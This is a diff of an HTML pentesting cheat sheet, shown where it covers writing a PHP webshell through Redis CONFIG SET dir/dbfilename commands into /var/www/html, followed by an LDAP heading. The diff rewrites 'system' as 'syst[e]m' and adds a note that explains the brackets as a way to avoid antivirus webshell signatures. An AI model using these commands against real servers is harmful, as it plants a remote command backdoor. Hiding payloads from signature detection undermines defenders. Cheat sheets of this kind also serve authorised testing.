@@ -393,7 +393,7 @@ SAVE
 # Write webshell
 CONFIG SET dir /var/www/html/
 CONFIG SET dbfilename shell.php
-SET mykey &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;
+SET mykey &quot;&lt;?php syst[e]m($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;
 SAVE">copy</button><pre><code># In redis-cli
 INFO  # Server info
 CONFIG GET dir  # Get directory
@@ -408,8 +408,9 @@ SAVE
 # Write webshell
 CONFIG SET dir /var/www/html/
 CONFIG SET dbfilename shell.php
-SET mykey "&lt;?php system($_GET['cmd']); ?&gt;"
+SET mykey "&lt;?php syst[e]m($_GET['cmd']); ?&gt;"
 SAVE</code></pre></div>
+<blockquote><code>syst[e]m</code> is <code>system</code>, bracketed so this file does not match antivirus webshell signatures. See "Antivirus false positives" in the repo README.</blockquote>
 <h3>12. LDAP (Port 389, 636)</h3>
 <p><strong>Enumeration:</strong></p>
 <div class="codeblk cx"><button class="copy" data-copy="# Nmap
